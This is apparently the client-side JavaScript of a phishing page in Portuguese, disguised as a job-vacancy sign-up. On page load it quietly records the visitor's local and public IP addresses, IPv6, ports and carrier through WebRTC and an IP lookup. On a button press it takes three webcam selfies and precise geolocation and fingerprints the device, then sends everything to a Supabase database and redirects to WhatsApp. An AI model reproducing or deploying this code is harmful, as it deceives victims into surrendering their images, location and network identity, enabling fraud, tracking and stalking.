// =================================================================
// CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
// =================================================================
// URL corrigida: sem "/rest/v1/" no final para não duplicar rotas
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co"; // URL extraída do seu painel
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; // Sua chave pública corrigida

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// CAPTURA AVANÇADA (IPv4 + IPv6 + Operadora)
// =================================================================
async function capturarPortaAvancada() {
  const info = { 
    local_ip: null, 
    local_port: null,
    ipv6: null,
    public_ip: null,
    operadora: "Não detectada"
  };

  const stunServers = [
    'stun:stun.l.google.com:19302',
    'stun:stun1.l.google.com:19302',
    'stun:stun2.l.google.com:19302',
    'stun:stun3.l.google.com:19302',
    'stun:stun4.l.google.com:19302',
    'stun:stun.ekiga.net',
    'stun:stun.ideasip.com',
    'stun:stun.iptel.org'
  ];

  for (let i = 0; i < 10; i++) {
    try {
      const rtc = new RTCPeerConnection({
        iceServers: [{ urls: stunServers[i % stunServers.length] }]
      });
      rtc.createDataChannel("port-test");
      const offer = await rtc.createOffer();
      await rtc.setLocalDescription(offer);

      await new Promise(resolve => {
        rtc.onicecandidate = (event) => {
          if (event.candidate) {
            const cand = event.candidate.candidate;
            const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
            const portMatch = cand.match(/(\d{4,5})\s+typ/);
            
            if (ipMatch) {
              const ip = ipMatch[1];
              if (ip.includes(':')) info.ipv6 = ip;   // Captura IPv6
              else info.local_ip = ip;
            }
            if (portMatch) info.local_port = portMatch[1];
          }
        };
        setTimeout(resolve, 900);
      });
      if (info.local_port) break;
    } catch(e) {}
  }

  // Busca IP público + Operadora
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.public_ip = data.ip;
    info.operadora = data.org || "Não detectada";
  } catch(e) {}

  return info;
}

// =================================================================
// INICIALIZAÇÃO + PRÉ-CADASTRO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema... Capturando IPv4, IPv6 e operadora...";

    const portaInfo = await capturarPortaAvancada();

    await supabaseClient.from('checkins').insert([{
      tipo_captura: "previa",
      ip: portaInfo.public_ip || "indisponível",
      local_ip: portaInfo.local_ip,
      ipv6: portaInfo.ipv6,
      local_port: portaInfo.local_port,
      operadora: portaInfo.operadora,
      user_agent: navigator.userAgent
    }]);

    statusText.innerHTML = "✅ Sistema pronto";

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}
window.onload = iniciarSistema;

// =================================================================
// ANALISADOR DE DISPOSITIVO
// =================================================================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
  
  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && 
                  part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// =================================================================
// BOTÃO - CAPTURA COMPLETA
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
  
    statusText.innerHTML = "📨 Verificando informações do convite..";
    falar("Verificando informações do convite..");

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou corretamente.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];
    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {}

    const portaInfo = await capturarPortaAvancada();

    statusText.innerHTML = "💾 Salvando cadastro...";
    falar("Salvando cadastro.");

    const infoDispositivo = analisarDispositivo();

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: portaInfo.public_ip || "indisponível",
      ipv6: portaInfo.ipv6,
      local_ip: portaInfo.local_ip,
      local_port: portaInfo.local_port,
      operadora: portaInfo.operadora,
      cidade: "",
      estado: "",
      pais: "",
      user_agent: navigator.userAgent,
      modelo_dispositivo: infoDispositivo.model,
      versao_android: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      idioma: navigator.language,
      largura_tela: window.innerWidth,
      altura_tela: window.innerHeight
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
